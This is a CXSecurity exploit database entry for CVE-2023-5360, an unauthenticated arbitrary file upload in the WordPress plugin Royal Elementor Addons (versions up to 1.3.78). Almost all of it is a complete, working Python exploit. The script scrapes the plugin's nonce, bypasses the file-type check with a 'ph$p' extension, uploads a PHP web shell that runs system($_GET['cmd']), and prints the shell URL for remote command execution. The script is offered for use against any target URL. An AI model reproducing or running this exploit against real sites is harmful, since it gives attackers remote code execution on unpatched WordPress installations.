---
title: Royal Elementor Addons and Templates 1.3.78 Unauthenticated Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2025040010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-07
fetch_date: 2025-10-06T22:03:37.885942
---

# Royal Elementor Addons and Templates 1.3.78 Unauthenticated Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Royal Elementor Addons and Templates 1.3.78 Unauthenticated Arbitrary File Upload** **2025.04.06**  Credit:  **[Sheikh Mohammad Hasan](https://cxsecurity.com/author/Sheikh%2BMohammad%2BHasan/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-5360](https://cxsecurity.com/cveshow/CVE-2023-5360/ "Click to see CVE-2023-5360")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: WordPress Plugin Royal Elementor Addons <= 1.3.78 - Unauthenticated Arbitrary File Upload (RCE)
# Date: 2025-04-04
# Exploit Author: Sheikh Mohammad Hasan (https://github.com/4m3rr0r)
# Vendor Homepage: https://royal-elementor-addons.com
# Software Link: https://downloads.wordpress.org/plugin/royal-elementor-addons.1.3.78.zip
# Version: <= 1.3.78
# Tested on: WordPress 6.3.1, Royal Elementor Addons 1.3.78, Ubuntu 22.04 + Apache2 + PHP 8.1
# CVE: CVE-2023-5360
# Description:
# The Royal Elementor Addons and Templates WordPress plugin before 1.3.79 does not properly validate uploaded files,
# which allows unauthenticated users to upload arbitrary files (such as .php), leading to Remote Code Execution (RCE).
import requests
import json
import re
import argparse
import tempfile
from urllib.parse import urljoin
from rich.console import Console
requests.packages.urllib3.disable\_warnings()
console = Console()
def get\_nonce(target):
try:
r = requests.get(target, verify=False, timeout=10)
m = re.search(r'var\s+WprConfig\s\*=\s\*({.\*?});', r.text)
if m:
nonce = json.loads(m.group(1)).get("nonce")
return nonce
except:
pass
return None
def upload\_shell(target, nonce, file\_path):
ajax\_url = urljoin(target, "/wp-admin/admin-ajax.php")
with open(file\_path, "rb") as f:
files = {"uploaded\_file": ("poc.ph$p", f.read())}
data = {
"action": "wpr\_addons\_upload\_file",
"max\_file\_size": 0,
"allowed\_file\_types": "ph$p",
"triggering\_event": "click",
"wpr\_addons\_nonce": nonce
}
try:
r = requests.post(ajax\_url, data=data, files=files, verify=False, timeout=10)
if r.status\_code == 200 and "url" in r.text:
resp = json.loads(r.text)
return resp["data"]["url"]
except:
pass
return None
def generate\_default\_shell():
with tempfile.NamedTemporaryFile(delete=False, suffix=".php") as tmp:
shell\_code = '<?php echo "Shell by 4m3rr0r - "; system($\_GET["cmd"]); ?>'
tmp.write(shell\_code.encode())
return tmp.name
def main():
parser = argparse.ArgumentParser(description="Royal Elementor Addons <= 1.3.78 - Unauthenticated Arbitrary File Upload (RCE)")
parser.add\_argument("-u", "--url", required=True, help="Target WordPress URL (e.g., https://target.com/)")
parser.add\_argument("-f", "--file", help="Custom PHP shell file to upload")
args = parser.parse\_args()
console.print("[cyan][\*] Getting nonce from WprConfig JS object...[/cyan]")
nonce = get\_nonce(args.url)
if not nonce:
console.print("[red][-] Failed to retrieve WprConfig nonce.[/red]")
return
console.print(f"[green][+] Nonce found: {nonce}[/green]")
if args.file:
shell\_file = args.file
console.print(f"[cyan][\*] Using provided shell: {shell\_file}[/cyan]")
else:
console.print("[cyan][\*] No shell provided. Creating default RCE shell...[/cyan]")
shell\_file = generate\_default\_shell()
console.print(f"[green][+] Default shell created at: {shell\_file}[/green]")
console.print("[cyan][\*] Uploading shell...[/cyan]")
uploaded\_url = upload\_shell(args.url, nonce, shell\_file)
if uploaded\_url:
console.print(f"[green][+] Shell uploaded successfully: {uploaded\_url}[/green]")
if not args.file:
console.print(f"[yellow][>] Access it with: {uploaded\_url}?cmd=id[/yellow]")
else:
console.print("[red][-] Upload failed. Target may be patched or not vulnerable.[/red]")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top